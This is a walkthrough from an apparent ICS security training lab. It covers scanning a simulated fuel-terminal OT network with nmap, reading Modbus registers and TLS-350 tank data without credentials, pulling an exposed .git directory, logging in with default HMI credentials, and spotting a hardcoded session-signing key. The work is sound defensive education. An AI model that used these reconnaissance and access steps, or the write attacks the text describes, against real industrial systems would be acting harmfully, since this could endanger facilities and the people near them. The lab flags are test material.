docs.title: Solution Walkthrough
docs.text:
Independent Mode

Want to try this on your own? You have the objective, the network topology, and the tools listed above. Skip the walkthrough and come back if you get stuck.

docs.title: Step 1: Identify Your Subnet
docs.text:
After connecting to the lab via VPN, determine your network interface and subnet:

ip addr show

Look for your VPN interface (tun0 or similar). Note the IP address and subnet. The OT network will be on a /24 subnet: giving you addresses .1 through .254 to scan.

Record your subnet

Write down your subnet base address (e.g., 10.100.5.0/24). You will use it in every exercise throughout this course.

docs.title: Step 2: Discover Live Hosts
docs.text:
Run a ping sweep to find all devices on the OT network:

nmap -sn {subnet}/24

Replace {subnet} with your actual subnet base address.

The -sn flag performs a ping scan only: no port probing. A ping scan is the safest initial scan for an OT environment because it generates minimal traffic.

Expected Output 
Starting Nmap 7.94SVN ( https://nmap.org )
Nmap scan report for 10.100.5.10
Host is up (0.0012s latency).
Nmap scan report for 10.100.5.11
Host is up (0.0011s latency).
Nmap scan report for 10.100.5.12
Host is up (0.0013s latency).
Nmap scan report for 10.100.5.13
Host is up (0.0010s latency).
Nmap scan report for 10.100.5.14
Host is up (0.0014s latency).
Nmap done: 256 IP addresses (5 hosts up) scanned in 2.43 seconds

You should see 5 hosts reported as up. Record all five IP addresses.

docs.title: Step 3: Service Scan on Discovered Hosts
docs.text:
Now enumerate what services each host is running. Perform a full-port service version scan:

nmap -sV -p- 10.100.5.10-14

Why -p-?

The -p- flag scans all 65,535 TCP ports, not just the default top 1,000. ICS protocols like Modbus (502) and TLS-350 (10001) are not in nmap's default scan range. Without -p-, you would miss them entirely.

The all-ports scan takes longer: expect 1-2 minutes. When it finishes, you will see each host with its open ports, services, and version strings.

Expected Output 
Nmap scan report for 10.100.5.10
PORT    STATE SERVICE  VERSION
502/tcp open  modbus   Modbus TCP

Nmap scan report for 10.100.5.11
PORT      STATE SERVICE VERSION
10001/tcp open  tcpwrapped

Nmap scan report for 10.100.5.12
PORT     STATE SERVICE VERSION
8080/tcp open  http    Python/3.11 aiohttp/3.9

Nmap scan report for 10.100.5.13
PORT     STATE SERVICE    VERSION
5432/tcp open  postgresql PostgreSQL 15.4

Nmap scan report for 10.100.5.14
PORT     STATE SERVICE VERSION
8888/tcp open  http    Python/3.11 http.server

What This Teaches

Notice the port distribution. The open ports map cleanly onto a textbook OT network:

  • Port 502: Modbus TCP, the most common ICS protocol in the world
  • Port 10001: TLS-350 ATG, used at fuel storage facilities everywhere
  • Port 8080: An HMI web interface for operators
  • Port 5432: A process historian storing operational data
  • Port 8888: An internal documentation server

None of these services require authentication to connect. Every one of them is a potential attack vector.

docs.title: Step 4: Banner Grabbing on Key Services
docs.text:
Use netcat to grab banners from the non-HTTP services. Start with the ATG simulator:

echo "I20100" | nc -w 5 10.100.5.11 10001

The string I20100 is a TLS-350 command that requests inventory data from tank 1. If the ATG is running, it will respond with tank level information.

Expected Output 
I20100
01
PREMIUM UNLEADED
07/15/2025 14:32
00004875      GALLONS
00002100      ULLAGE
00012000      CAPACITY
00068.2       TEMPERATURE

What just happened?

You sent a single command to an industrial tank gauge and received real-time fuel level data: with no authentication. In a real facility, this protocol is reachable over the internet at thousands of gas stations and fuel terminals. The ATG protocol has no concept of passwords or access control.

Now test the documentation server:

curl -s http://10.100.5.14:8888/
Expected Output 
<html>
<head><title>HPB Internal Documentation</title></head>
<body>
<h1>Hex Point Bay Terminal -- Internal Documentation</h1>
<ul>
  <li><a href="/sops/">Standard Operating Procedures</a></li>
  <li><a href="/network/">Network Diagrams</a></li>
  <li><a href="/maintenance/">Maintenance Schedules</a></li>
</ul>
</body>
</html>

The documentation server is serving internal facility documents over HTTP with no access controls.

docs.title: Step 5: Discover the Exposed Git Repository
docs.text:
Web servers sometimes serve their entire project directory: including the .git folder if one exists. Serving that folder is a well-known vulnerability called Git directory exposure. Check if the documentation server has one:

curl -s http://10.100.5.14:8888/.git/HEAD
Expected Output 
ref: refs/heads/main

If you see ref: refs/heads/main, the .git directory is publicly accessible. Public access exposes the entire source code history of the documentation site to anyone who can reach it.

Why is .git exposure dangerous?

A .git directory contains:

  • Every version of every file ever committed
  • Commit messages that may reference internal systems, credentials, or ticket numbers
  • Author names and email addresses of developers
  • Configuration files that may have been removed from the live site but still exist in history
  • Secrets (API keys, passwords) that were accidentally committed and later deleted, but still exist in Git history

docs.title: Step 6: Retrieve the Flag
docs.text:
The flag is stored as a reference in the Git repository. Read the main branch reference:

curl -s http://10.100.5.14:8888/.git/refs/heads/main
Expected Output 
OCR{...find_me...}

Flag Found

Flag: Submit what you find in the .git/refs/heads/main response.

You discovered an exposed Git repository on the facility's internal documentation server. In a real engagement, this would be a critical finding: the entire commit history of the documentation site is accessible without authentication, potentially leaking network diagrams, credentials, and operational procedures.

docs.title: Step 7: Document Your Findings
docs.text:
Build a summary table of everything you discovered:

Host IP Port(s) Service Security Issues PLC Simulator .10 502 Modbus TCP No authentication, accepts reads from any host ATG Simulator .11 10001 TLS-350 No authentication, leaks tank inventory data Operator HMI .12 8080 HTTP (aiohttp) Web dashboard accessible without credentials Process Historian .13 5432 PostgreSQL Database port exposed to entire subnet Documentation Server .14 8888 HTTP .git directory exposed, internal docs publicly accessible

docs.title: Analysis Questions
docs.text:
Test your understanding of what you discovered.

1. Why didn't Modbus (port 502) and TLS-350 (port 10001) appear in a default nmap scan?

Reveal Answer

By default, nmap only scans the top 1,000 most common TCP ports. Modbus TCP (502) is included in this default set, but port 10001 is not. To find all ICS services, you must use -p- (all ports) or explicitly specify the ports you want to scan with -p 502,10001,8080,5432,8888. In ICS assessments, always scan the full port range: ICS protocols use non-standard ports that nmap's defaults will miss.

2. What makes the .git directory exposure particularly dangerous on an OT network documentation server?

Reveal Answer

The documentation server likely contains network diagrams, IP addresses, device configurations, default credentials, and operational procedures for the entire facility. With Git history access, an attacker can recover deleted files: meaning even if sensitive content was removed from the live site, it may still exist in previous commits. On an OT network, this information directly enables targeted attacks against PLCs, HMIs, and safety systems.

3. You connected to the ATG on port 10001 and received tank inventory data without any credentials. Why is this the norm for ICS protocols rather than an exception?

Reveal Answer

Most ICS protocols (Modbus, DNP3, TLS-350, BACnet, EtherNet/IP) were designed in the 1970s-1990s for physically isolated serial networks. Security was provided by physical access control: if you could reach the wire, you were authorized. When these protocols were migrated to TCP/IP and connected to routable networks, no authentication was added. The TLS-350 protocol has no concept of passwords or access tokens. Any TCP connection to port 10001 that sends valid commands will receive responses.

4. All five OT devices are on the same subnet with no segmentation. What risks does this create?

Reveal Answer

A flat OT network means that compromising any single device gives an attacker direct network access to every other device. If an attacker compromises the documentation server (the least critical asset), they can directly reach the PLC (the most critical asset). In a properly segmented network, the PLC would be in a separate zone (Purdue Level 1) with firewall rules restricting which devices can communicate with it. The IEC 62443 standard and Purdue Model both require zone-based segmentation for exactly this reason.

docs.title: Key Takeaways
docs.text:
What You Learned

  1. ICS networks use different protocols and ports. Modbus TCP (502), TLS-350 (10001), and other ICS protocols won't appear in default scans. Always use full-port scanning in OT assessments.

  2. ICS protocols have no authentication. You connected to a PLC and an ATG without any credentials. The lack of authentication is by design: these protocols predate modern security concepts.

  3. Git directory exposure is a critical finding. The .git folder on the documentation server leaks the entire commit history, potentially including removed credentials and internal network details.

  4. Flat OT networks are dangerously common. All five devices on the same subnet means compromising one gives access to all. Network segmentation following the Purdue Model is essential for ICS security.

  5. Documentation servers are high-value targets. Internal docs contain network diagrams, IP addresses, procedures, and credentials: everything an attacker needs to plan targeted ICS attacks.

docs.title: What's Next
docs.text: You have mapped the OT network and identified all five hosts. In the next exercise, ICS-1.2: Modbus Enumeration, you will connect directly to the PLC simulator on port 502 and read the holding registers that control tank levels, valve states, and alarm conditions.

docs.title: Engagement Status
docs.text:
Client: Hex Point Energy Solutions Role: Security Intern Phase: Reconnaissance >> Modbus Enumeration << HMI Recon Protocol Exploitation Attack Chains

What you know so far:

  • You've mapped the OT network and identified 5 hosts (ICS-1.1)
  • The PLC simulator on .10:502 speaks Modbus TCP with no authentication
  • The ATG simulator on .11:10001 responds to TLS-350 commands
  • The documentation server has an exposed .git directory
  • You recovered the first flag from the exposed .git repository

Your task: Connect to the PLC simulator via Modbus TCP, read all holding registers, interpret the tank level data, and decode a flag hidden in registers 40-43.

docs.title: Objective
docs.text:
Use Python and the pymodbus library to enumerate every register on the Hex Point Bay Terminal's PLC simulator. Read holding registers, input registers, and coils to build a complete picture of the facility's operational state. Decode the flag embedded in registers 40-43.

Difficulty: Beginner Estimated time: 25 minutes

docs.title: History
docs.text:
Modbus was created in 1979 by Modicon (now Schneider Electric) for communication between programmable logic controllers. It was one of the first open industrial protocols and remains the most widely deployed ICS protocol in the world: found in power plants, water treatment facilities, oil refineries, and manufacturing lines.

The original Modbus ran over serial lines (RS-232/RS-485). In the late 1990s, Modbus TCP wrapped the same protocol in TCP/IP packets, making it routable over Ethernet networks. The protocol itself was not changed: no authentication, no encryption, no integrity checking was added.

docs.title: Why Modbus Has No Security
docs.text:
Modbus was designed for an era when:

  • Controllers were connected by dedicated serial cables in locked control rooms
  • Physical security was the only access control needed
  • Networks were air-gapped from business systems and the internet
  • The concept of a cyber attack on industrial systems did not exist

Today, Modbus TCP runs on IP networks that are often reachable from corporate LANs, VPNs, and sometimes the public internet. The protocol has not changed. Anyone who can establish a TCP connection to port 502 can read, and write, process data.

docs.title: Register Types
docs.text:
Modbus organizes data into four types:

Type Access Size Address Range Description Holding Registers Read/Write 16-bit 40001-49999 Primary process data: setpoints, control values, configuration Input Registers Read-Only 16-bit 30001-39999 Measured values from sensors: temperatures, pressures, levels Coils Read/Write 1-bit 00001-09999 Boolean outputs: valve open/close, pump on/off, relay states Discrete Inputs Read-Only 1-bit 10001-19999 Boolean inputs: limit switches, safety interlocks, alarm states

docs.title: Function Codes
docs.text:
Each Modbus operation uses a function code to specify what action to perform:

Function Code Name Action FC01 Read Coils Read boolean output states FC02 Read Discrete Inputs Read boolean input states FC03 Read Holding Registers Read 16-bit read/write registers FC04 Read Input Registers Read 16-bit read-only registers FC05 Write Single Coil Set a single boolean output FC06 Write Single Register Set a single 16-bit register FC16 Write Multiple Registers Set multiple 16-bit registers at once

In this exercise, you will use FC03 (Read Holding Registers), FC01 (Read Coils), and FC04 (Read Input Registers).

docs.title: Data Representation
docs.text:
Modbus registers are 16-bit unsigned integers (0-65535). Real-world process values are mapped to this range using scaling factors. For example:

  • A tank level of 42,500 barrels in a 50,000 bbl tank might be stored as 42500 in a register
  • A temperature of 68.2 degrees might be stored as 682 (multiply by 10 to avoid decimals)
  • A percentage like 85.0% might be stored as 8500 (multiply by 100)

The PLC programmer decides the scaling. Without documentation (or reverse engineering), you must interpret what the raw register values mean.

docs.title: Solution Walkthrough
docs.text:
Independent Mode

You have the register map, the tools, and the target IP. Try writing your own Modbus client script before reading the walkthrough. The pymodbus documentation is at https://pymodbus.readthedocs.io/.

docs.title: Step 1: Verify Modbus Port Is Open
docs.text:
Confirm the PLC simulator is reachable on port 502:

nmap -sV -p 502 10.100.5.10
Expected Output 
PORT    STATE SERVICE VERSION
502/tcp open  modbus  Modbus TCP

Port 502 is open and nmap identifies it as Modbus. You can connect directly.

docs.title: Step 2: Read Tank Level Registers
docs.text:
Create a Python script to read the holding registers. The script connects to the PLC and reads registers 0-43:

python3 << 'PYEOF'
from pymodbus.client import ModbusTcpClient

# Connect to the PLC simulator
client = ModbusTcpClient('10.100.5.10', port=502)
client.connect()

# Read holding registers 0-43 (FC03)
result = client.read_holding_registers(address=0, count=44, slave=1)

if result.isError():
    print(f"Error: {result}")
else:
    registers = result.registers
    print("=" * 60)
    print("HOLDING REGISTERS (FC03) -- Hex Point Bay Terminal PLC")
    print("=" * 60)

    # AST-01: Gasoline
    print(f"\n--- AST-01: Gasoline (50,000 bbl capacity) ---")
    print(f"  Level:       {registers[0]} bbl")
    print(f"  Temperature: {registers[1] / 10:.1f} °F")
    print(f"  Pressure:    {registers[2] / 10:.1f} PSI")
    print(f"  Fill Rate:   {registers[3]} bbl/hr")

    # AST-02: Diesel
    print(f"\n--- AST-02: Diesel (75,000 bbl capacity) ---")
    print(f"  Level:       {registers[10]} bbl")
    print(f"  Temperature: {registers[11] / 10:.1f} °F")
    print(f"  Pressure:    {registers[12] / 10:.1f} PSI")
    print(f"  Fill Rate:   {registers[13]} bbl/hr")

    # AST-03: Jet Fuel
    print(f"\n--- AST-03: Jet Fuel (30,000 bbl capacity) ---")
    print(f"  Level:       {registers[20]} bbl")
    print(f"  Temperature: {registers[21] / 10:.1f} °F")
    print(f"  Pressure:    {registers[22] / 10:.1f} PSI")
    print(f"  Fill Rate:   {registers[23]} bbl/hr")

    # Pipeline
    print(f"\n--- Pipeline ---")
    print(f"  Flow Rate:   {registers[30]} bbl/hr")
    print(f"  Pressure:    {registers[31] / 10:.1f} PSI")

    # Flag registers
    print(f"\n--- Registers 40-43 (Raw) ---")
    for i in range(40, 44):
        print(f"  Register {i}: {registers[i]} (0x{registers[i]:04X})")

client.close()

What This Teaches

You just read real-time process data from a PLC without any credentials. You know:

  • Exact tank levels for all three above-ground storage tanks
  • Tank temperatures and pressures
  • Active fill rates (Diesel is currently being filled at 150 bbl/hr)
  • Pipeline status

An attacker with this information knows the physical state of the entire facility.

docs.title: Step 3: Interpret the Tank Level Data
docs.text:
Let's calculate how full each tank is:

Tank Product Current Level Capacity Fill % AST-01 Gasoline 42,500 bbl 50,000 bbl 85.0% AST-02 Diesel 61,200 bbl 75,000 bbl 81.6% AST-03 Jet Fuel 18,750 bbl 30,000 bbl 62.5%

Why this matters

Knowing tank levels tells an attacker:

  • Which tanks are nearly full: overfilling a tank causes environmental spills and regulatory violations
  • Which tanks are actively being filled: disrupting a fill operation can cause product loss
  • Operational patterns: monitoring levels over time reveals delivery schedules and customer demand

docs.title: Step 4: Read Coil States (Valve Status)
docs.text:
Read the coils to see which valves are open and which equipment is running:

python3 << 'PYEOF'
from pymodbus.client import ModbusTcpClient

client = ModbusTcpClient('10.100.5.10', port=502)
client.connect()

# Read coils 0-7 (FC01)
result = client.read_coils(address=0, count=8, slave=1)

if result.isError():
    print(f"Error: {result}")
else:
    coils = result.bits[:8]
    labels = [
        "AST-01 Inlet Valve",
        "AST-01 Outlet Valve",
        "AST-02 Inlet Valve",
        "AST-02 Outlet Valve",
        "AST-03 Inlet Valve",
        "AST-03 Outlet Valve",
        "Pipeline Pump",
        "Emergency Shutdown",
    ]

    print("=" * 50)
    print("COIL STATES (FC01) -- Valve & Equipment Status")
    print("=" * 50)
    for i, (label, state) in enumerate(zip(labels, coils)):
        status = "OPEN/ON" if state else "CLOSED/OFF"
        indicator = "[*]" if state else "[ ]"
        print(f"  Coil {i}: {indicator} {label:30s} -- {status}")

client.close()
PYEOF
Expected Output

COIL STATES (FC01) -- Valve & Equipment Status
==================================================

  Coil 1: [ ] AST-01 Outlet Valve              -- CLOSED/OFF
  Coil 2: [*] AST-02 Inlet Valve               -- OPEN/ON
  Coil 3: [ ] AST-02 Outlet Valve              -- CLOSED/OFF
  Coil 4: [ ] AST-03 Inlet Valve               -- CLOSED/OFF
  Coil 5: [ ] AST-03 Outlet Valve              -- CLOSED/OFF

Observation

The AST-02 inlet valve is open and the pipeline pump is on, consistent with the Diesel fill operation we saw in the holding registers (fill rate of 150 bbl/hr). The emergency shutdown is in normal state.

docs.title: Step 6: Decode the Flag from Registers 40-43
docs.text:
Registers 40-43 contain the flag encoded as ASCII characters packed into 16-bit registers. Each register holds two ASCII characters (high byte and low byte).

python3 << 'PYEOF'
from pymodbus.client import ModbusTcpClient

client = ModbusTcpClient('10.100.5.10', port=502)
client.connect()

# Read flag registers 40-43
result = client.read_holding_registers(address=40, count=4, slave=1)

if result.isError():
    print(f"Error: {result}")
else:
    regs = result.registers
    print("Raw register values:")
    for i, r in enumerate(regs):
        high_byte = (r >> 8) & 0xFF
        low_byte = r & 0xFF
        print(f"  Register {40+i}: {r} → 0x{r:04X} → "
              f"'{chr(high_byte)}{chr(low_byte)}'")

    # Decode all registers to string
    flag_chars = ""
    for r in regs:
        flag_chars += chr((r >> 8) & 0xFF)
        flag_chars += chr(r & 0xFF)

    print(f"\nDecoded string: {flag_chars}")
    print(f"Complete flag:  OCR{{{flag_chars}}}")

client.close()
PYEOF
Expected Output 
Raw register values:
  Register 40: 20291 → 0x4F43 → 'OC'
  Register 41: 21299 → 0x5333 → 'S3'
  Register 42: 28018 → 0x6D72 → 'mr'
  Register 43: 25904 → 0x6530 → 'e0'

How the encoding works

Each 16-bit Modbus register stores two ASCII characters:

  • High byte (bits 15-8): First character
  • Low byte (bits 7-0): Second character

For register 40 with value 20291 (hex 0x4F43):

  • High byte: 0x4F = 79 = ASCII O
  • Low byte: 0x43 = 67 = ASCII C

Reading all four registers gives you the encoded portion of the flag.

Flag Found

Submit the decoded flag from registers 40-43 in the platform.

You enumerated every register on the PLC and decoded a flag hidden in the holding registers. In a real facility, flag registers wouldn't exist, but the technique of reading and interpreting register data is identical to what you would do during an actual ICS assessment.

docs.title: Analysis Questions
docs.text:
1. Modbus has no authentication. Why hasn't the protocol been updated to add it?

Reveal Answer

There are several reasons:

  • Backwards compatibility: Millions of deployed devices run Modbus. Adding authentication would break compatibility with every existing PLC, RTU, and HMI.
  • Resource constraints: Many Modbus devices have 8-bit or 16-bit processors with kilobytes of memory. They cannot run TLS or modern cryptographic functions.
  • Operational priority: ICS operators prioritize availability over security. Any protocol change that could cause communication failures is resisted.
  • Cost: Replacing industrial equipment costs millions and requires plant shutdowns.

The industry response has been to add security around Modbus (firewalls, network segmentation, monitoring) rather than changing the protocol itself.

2. You read that Diesel (AST-02) is being filled at 150 bbl/hr with the inlet valve open. What could an attacker do with write access to these registers?

Reveal Answer

With Modbus write access (FC05 for coils, FC06/FC16 for registers), an attacker could:

  • Open all valves simultaneously: causing uncontrolled product flow and potential spills
  • Close the inlet valve during a fill operation: causing pipeline overpressure upstream
  • Manipulate level readings: making operators think a tank is empty when it's full (or vice versa), leading to overfills or runouts
  • Suppress alarms: writing 0 to alarm input registers so operators don't see dangerous conditions
  • Trigger the emergency shutdown: halting all operations and causing financial loss

This is exactly what happened in real-world ICS attacks like the 2015 Ukraine power grid attack and the 2017 Triton/TRISIS malware targeting safety systems.

3. The register values use different scaling factors (1:1, x10, x100). Why is this a challenge for attackers, and defenders?

Reveal Answer

Without the register map documentation, raw register values are meaningless. A value of 682 could be 682 barrels, 68.2 degrees, 6.82 PSI, or something else entirely. Attackers must reverse-engineer the scaling to understand what they're looking at and craft meaningful write operations. Defenders face the same challenge when building intrusion detection systems: monitoring for "abnormal" register values requires understanding what normal looks like for each specific register. The documentation server exposure in ICS-1.1 is so dangerous precisely because it likely contains the register maps that make all other attacks possible.

docs.title: Key Takeaways
docs.text:
What You Learned

  1. Modbus TCP provides complete read access with no credentials. You read every register on the PLC, tank levels, temperatures, pressures, valve states, and alarm conditions, without authenticating.

  2. Register data reveals the physical state of the facility. Knowing that AST-02 is at 81.6% capacity and actively being filled gives an attacker precise operational intelligence.

  3. Data encoding in registers follows conventions, not standards. Scaling factors, byte ordering, and data packing vary between vendors and configurations. The register map is the decoder ring.

  4. Coils and input registers complete the picture. Beyond tank levels, you now know which valves are open, which pumps are running, and whether any alarms are active.

  5. Read access enables write attacks. Everything you read with FC03/FC01/FC04 can potentially be written with FC06/FC05/FC16. Understanding the register layout is the prerequisite for manipulation attacks in Level 2.

docs.title: What's Next
docs.text: You have enumerated the PLC's registers and understand the facility's operational state. In the next exercise, ICS-1.3: HMI Reconnaissance, you will explore the operator's web-based SCADA dashboard, discover unauthenticated API endpoints, and find credentials and flags hidden in the HMI's page source.

docs.title: Objective
docs.text:
Perform a thorough reconnaissance of the Hex Point Bay Terminal operator HMI (Human-Machine Interface). Discover what data the dashboard exposes, identify the API endpoints that serve process data without authentication, and find sensitive information hidden in the application HTML source.

Difficulty: Beginner Estimated time: 20 minutes

docs.title: What Is an HMI?
docs.text:
A Human-Machine Interface (HMI) is the operator window into the industrial process. It displays real-time data from PLCs and sensors, allows operators to send control commands, and alerts them when conditions become abnormal.

Modern HMIs are web-based applications: they replace the dedicated hardware panels and proprietary software of previous decades. The web-based design means they run on standard web servers, speak HTTP, use JavaScript frameworks, and are vulnerable to the same classes of attacks as any other web application.

flowchart LR
    OP["Operator"] -->|"Browser"| HMI["HMI Web Server<br/>:80"]
    HMI -->|"Modbus TCP<br/>:502"| PLC["PLC"]
    HMI -->|"SQL<br/>:5432"| HIST["Historian DB"]
    HMI -->|"TLS-350<br/>:10001"| ATG["ATG"]

    style OP fill:#1a1a2e,stroke:#6366f1
    style HMI fill:#0d3b2e,stroke:#14b8a6
    style PLC fill:#0d3b2e,stroke:#14b8a6
    style HIST fill:#0d3b2e,stroke:#14b8a6
    style ATG fill:#0d3b2e,stroke:#14b8a6

docs.title: Why HMIs Are High-Value Targets
docs.text:
The HMI is the command and control center of the facility. Compromising it gives an attacker:

  • Visibility: Real-time and historical views of every process variable
  • Control: Ability to send commands to PLCs and change setpoints
  • Concealment: Ability to modify what operators see on their screens while the physical process behaves differently (a technique used in the Stuxnet attack)

docs.title: Common HMI Vulnerabilities
docs.text:
Vulnerability Description Real-World Impact Default credentials Vendor-shipped usernames and passwords that are never changed Attackers gain full operator access No authentication API endpoints or pages accessible without login Process data and controls exposed to anyone on the network Session management flaws Weak signing secrets, query-parameter auth bypasses, no timeout Session forgery, unauthorized commands Information disclosure Debug info, comments, stack traces in HTML source Internal architecture and credentials leaked Lack of HTTPS All traffic in plaintext over HTTP Credential sniffing, session hijacking, MITM CSRF (Cross-Site Request Forgery) No anti-CSRF tokens on control actions Attacker tricks operator browser into sending commands

OWASP for ICS

Many of these vulnerabilities overlap with the OWASP Top 10 for web applications. ICS HMIs often lag years behind standard web security practices. Vendors prioritize functionality and uptime over security patching.

docs.title: Solution Walkthrough
docs.text:
Independent Mode

Open the HMI address from the Exercise Network panel in your browser and explore. Try default credentials. Watch the browser network tab while the cockpit loads. Check for API endpoints. Come back to the walkthrough if you get stuck.

docs.title: Step 1: Browse to the HMI
docs.text:
Open the HMI in your browser, or use curl to fetch the front page. Both / and /dashboard require a login, so an unauthenticated request lands on the operator login page.

Kali

curl -s http://<hmi>/ | head -n 12
Expected Output 
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Login. Hex Point Bay Terminal</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
...

The front page is the operator login. The interesting question for a recon engagement is not the login form itself: it is whether every page and every data source behind it is actually gated by that login. As you will see, the data endpoints are not.

docs.title: Step 2: Try Default Credentials
docs.text:
Fetch the login page, then test common default credentials. In ICS environments default credentials are extremely common.

Kali

curl -s http://<hmi>/login | head -n 6

The form posts username and password to /login. Submit the default operator credentials and watch the response headers. Save the session cookie to a file so you can reuse it later.

Kali

curl -s -i -X POST http://<hmi>/login \
  -d "username=operator&password=hpb2024" \
  -c cookies.txt 2>&1 | grep -iE "^(HTTP|Location|Set-Cookie)"
Expected Output 
HTTP/1.1 302 FOUND
Location: /dashboard
Set-Cookie: session=eyJ...<payload>.<timestamp>.<signature>; HttpOnly; Path=/

Default Credentials Work

The credentials operator / hpb2024 are accepted. The login returns a 302 redirect to /dashboard and sets a Flask signed session cookie. The cookie has three dot-separated parts: a base64url payload, a timestamp, and an HMAC signature. Decode only the first part (it is not secret, just base64url-encoded JSON):

# take the payload (text before the first dot) from the session cookie value
python3 - <<'PY'
import base64
payload = "eyJ...<payload>"   # the part before the first dot
payload += "=" * (-len(payload) % 4)
print(base64.urlsafe_b64decode(payload))
PY

The decoded payload looks like {"logged_in": true, "token": "hpb-operator-<timestamp>", "username": "operator"}. The cookie is signed, so you cannot edit the payload and keep it valid unless you know the signing key. The next steps cover why that signing key is not the protection it looks like.

Weak hardcoded signing key

The server signs sessions with a hardcoded secret key, hpb-operator-console-key-2024, baked straight into the application source. A signed cookie is only as strong as the secret behind it. If that key leaks (and a hardcoded vendor key in source control or a firmware image usually does), an attacker can forge a session with logged_in: true for any username and the server will trust it. Signing without a strong, secret, per-deployment key gives the appearance of security without the substance.

docs.title: Step 3: Explore the Cockpit Dashboard
docs.text:
Use the saved cookie to load the dashboard.

Kali

curl -s -b cookies.txt http://<hmi>/dashboard | head -n 8

The /dashboard route renders an immersive operator cockpit: a live HTML5 Canvas mimic of the terminal with animated tanks, the pipeline, and the marine loading berths. It is the polished console an operator stares at all shift.

The polished operator cockpit that the Hex Point Bay operators trust. Every tank, valve, and berth animates from live process data, yet the same data is served to anyone on the network through unauthenticated APIs.

The recon payoff is not the cockpit chrome: it is where the cockpit gets its numbers. Open the browser DevTools Network tab while the dashboard refreshes and you will see the page polling a set of /api/* endpoints. The cockpit needs a login to render, but the JavaScript behind it pulls process data from API routes that do not. Any host on the OT network can call those same endpoints directly, with no cookie at all. Steps 4 and 5 do exactly that.

Literally behind the dashboard: the Engineering X-ray view binds every cockpit element to its live Modbus register or ATG gauge, exposing the full process image map that an attacker rebuilds for free from the unauthenticated `/api/*` feeds. Mapping that source data is the goal of this recon exercise.

docs.title: Step 4: Discover the Unauthenticated API Endpoints
docs.text:
The cockpit JavaScript consumes several JSON API endpoints. Query them directly with no cookie and confirm they answer anyway. Start with the tank data.

Kali

curl -s http://<hmi>/api/tanks | python3 -m json.tool | head -n 20
Expected Output 
{
    "TK-101": {
        "capacity": 50000,
        "fill_pct": 72.4,
        "flow_rate": 125.3,
        "id": "TK-101",
        "level": 72.4,
        "name": "Tank 101",
        "pressure": 14.8,
        "product": "Regular Unleaded (87)",
        "status": "NORMAL",
        "temperature": 68.2,
        "type": "AST",
        "unit": "gal",
        "valve_inlet": true,
        "valve_outlet": false,
        "volume": 36200,
        "water_level": 0.0
    },
    ...
}

/api/tanks returns a JSON object keyed by tank id, with one record per tank. The terminal has five tanks:

Tank Product Type Capacity TK-101 Regular Unleaded (87) AST (above-ground) 50,000 gal TK-102 Premium Unleaded (93) AST (above-ground) 50,000 gal TK-103 Diesel #2 AST (above-ground) 75,000 gal TK-201 Jet-A UST (underground) 30,000 gal TK-202 Ethanol (E85) UST (underground) 30,000 gal

Each record carries level, volume (gal), fill_pct, temperature, pressure, flow rate, water level, status, and inlet/outlet valve states. No authentication was required to read any of it. Now query the pipeline endpoint.

Kali

curl -s http://<hmi>/api/pipeline | python3 -m json.tool
Expected Output 
{
    "daily_throughput": 24830,
    "flow_rate": 385.8,
    "flow_unit": "gal/min",
    "pressure_in": 145.2,
    "pressure_out": 138.7,
    "pressure_unit": "psi",
    "pump_1": true,
    "pump_2": true,
    "pump_3": false,
    "status": "FLOWING",
    "temp_unit": "F",
    "temperature": 67.5,
    "throughput_unit": "gal",
    "total_throughput": 1842567,
    "valve_bypass": false,
    "valve_emergency": false,
    "valve_main": true
}

Then the alarm feed, which returns a flat JSON array of alarm objects.

Kali

curl -s http://<hmi>/api/alarms | python3 -m json.tool | head -n 24
Expected Output 
[
    {
        "acknowledged": false,
        "id": 1,
        "message": "Low level alarm. Ethanol (E85) below 25%",
        "severity": "HIGH",
        "source": "TK-202",
        "timestamp": "2026-06-13T12:10:06.572595+00:00"
    },
    {
        "acknowledged": false,
        "id": 2,
        "message": "High level warning. Diesel #2 above 85%",
        "severity": "MEDIUM",
        "source": "TK-103",
        "timestamp": "2026-06-13T11:37:06.572595+00:00"
    },
    ...
]

What This Teaches

The cockpit needs a login, but the data routes behind it do not. The unauthenticated recon surface includes /api/tanks, /api/pipeline, /api/alarms, /api/loading, and /api/status. Together they expose:

  • Real-time process data for every tank, the pipeline, and the loading berths
  • Alarm history with timestamps and severities
  • System status showing which back-end links (Modbus, ATG, historian) are connected

docs.title: Step 5: Confirm No Authentication on the API
docs.text:
Confirm that the API truly ignores authentication by hitting it with an explicitly empty cookie and parsing the result.

Kali

curl -s -H "Cookie:" http://<hmi>/api/tanks | python3 -c "
import sys, json
data = json.load(sys.stdin)
print(f'Received {len(data)} tank records without authentication')
for tid, t in data.items():
    print(f'  {tid}: {t[\"product\"]} -- {t[\"fill_pct\"]}% full ({t[\"unit\"]})')
"
Expected Output 
Received 5 tank records without authentication
  TK-101: Regular Unleaded (87) -- 72.4% full (gal)
  TK-102: Premium Unleaded (93) -- 45.1% full (gal)
  TK-103: Diesel #2 -- 88.7% full (gal)
  TK-201: Jet-A -- 61.3% full (gal)
  TK-202: Ethanol (E85) -- 23.6% full (gal)

Confirmed: the API endpoints have no authentication at all. Any device on the OT network can poll them.

docs.title: Step 6: View the Alarm Page Source and Find the Flag
docs.text:
The /alarms page is login-gated, so the flag in its source is only reachable with a valid session. You already saved the operator session to cookies.txt in Step 2. Reuse it with curl -b and grep the source for an HTML comment.

Kali

curl -s -b cookies.txt http://<hmi>/alarms | grep -iE "OCR\{|<!--"
Expected Output 
<!-- OCR{hm1_r3c0n_...} -->

Flag Found

Submit the flag found in the HTML comment. The flag value is masked here. View the real comment on the deployed /alarms page source to read the full value, then submit it.

The comment was reachable only because you logged in first: the alarm page enforces the operator session, while the /api/* data endpoints do not. In a real HMI, HTML comments frequently contain debug strings, internal keys, and configuration that developers forgot to strip before deployment.

docs.title: Step 7: Note the Session Vulnerabilities
docs.text:
The login flow in Step 2 looked ordinary: a signed cookie, an HttpOnly flag, a redirect. Two weaknesses sit underneath it.

Two real session vulnerabilities

  1. Weak hardcoded signing key. The Flask session is signed with hpb-operator-console-key-2024, a fixed string compiled into the application. A signed session is only trustworthy when the signing secret is strong, secret, and unique per deployment. A hardcoded vendor key fails all three: once it leaks, an attacker forges a {"logged_in": true} session for any operator and the server accepts it.

